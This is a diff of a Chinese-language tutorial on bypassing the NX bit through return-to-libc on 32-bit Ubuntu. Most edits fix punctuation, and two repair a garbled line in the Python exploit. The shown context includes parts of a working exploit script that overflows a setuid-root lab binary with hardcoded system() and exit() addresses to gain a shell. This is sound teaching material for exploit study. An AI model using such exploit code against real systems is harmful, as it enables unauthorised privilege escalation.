@@ -17,7 +17,7 @@ VM Setup: Ubuntu 12.04 (x86)
 
 设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!  
 
-漏洞代码： 下面这份代码基于前文中漏洞代码作了一点修改。我会在后文中讲述修改的必要性。  
+漏洞代码： 下面这份代码基于前文中漏洞代码作了一点修改，我会在后文中讲述修改的必要性。  
 
 ``` c
  //vuln.c
@@ -40,7 +40,7 @@ $sudo chown root vuln
 $sudo chgrp root vuln
 $sudo chmod +s vuln
 ```
-注意: “-z exexstack”参数并没有传递给gcc,因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：  
+注意: “-z exexstack”参数并没有传递给gcc，因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：  
 
 ``` bash
 $ readelf -l vuln
@@ -65,7 +65,7 @@ $
 
 可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。  
 
-之前我们已经反汇编并画出了漏洞代码的栈布局。现在开始写个漏洞利用代码来绕过NX比特位吧！  
+之前我们已经反汇编并画出了漏洞代码的栈布局，现在开始写个漏洞利用代码来绕过NX比特位吧！  
 
 漏洞利用代码
 
@@ -87,7 +87,7 @@ exit = 0xb7e54be0          #0xb7e2000+0x00032be0
 system_arg = 0x804827d     #(obtained from hexdump output of the binary)
 #endianess conversion
 def conv(num):
- return struct.pack("<I",numystem + exit + system_arg
+ return struct.pack("<I",num)
 buf = "A" * 268
 buf += conv(system)
 buf += conv(exit)
@@ -137,7 +137,7 @@ exit = 0xb7e54be0
 system_arg = 0x804829d
 #endianess conversion
 def conv(num):
- return struct.pack("<I",numystem + exit + system_arg
+ return struct.pack("<I",num)
 buf = "A" * 268
 buf += conv(system)
 buf += conv(exit)
@@ -145,7 +145,7 @@ buf += conv(system_arg)
 print "Calling vulnerable program"
 call(["./vuln_priv", buf])
 ```
-注意:exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量  
+注意：exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量  
 
 ``` bash
 $ python exp_priv.py 
